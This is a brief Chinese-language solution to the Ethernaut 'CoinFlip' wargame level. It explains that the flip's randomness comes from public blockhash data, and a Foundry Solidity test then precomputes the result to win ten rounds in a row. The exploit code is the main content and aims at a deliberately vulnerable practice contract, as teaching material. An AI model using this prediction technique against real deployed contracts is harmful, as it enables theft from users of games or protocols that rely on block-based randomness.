决定每次 `coinFlip` 的随机数由链上的公开数据确定，因此可以直接计算出每次的结果，就可以每次都猜对了。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/CoinFlip.sol";
import "src/levels/CoinFlipFactory.sol";

import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestCoinFlip is BaseTest {
    using SafeMath for uint256;
    CoinFlip private level;

    constructor() public {
        levelFactory = new CoinFlipFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = CoinFlip(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint8 rounds = 10;

        for(uint8 i = 0; i < rounds; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue.div(FACTOR);
            bool side = coinFlip == 1 ? true : false;
            bool result = level.flip(side);
            console.log(result);

            // get another block
            utilities.mineBlocks(1);
        }
        vm.stopPrank();
    }
}
```

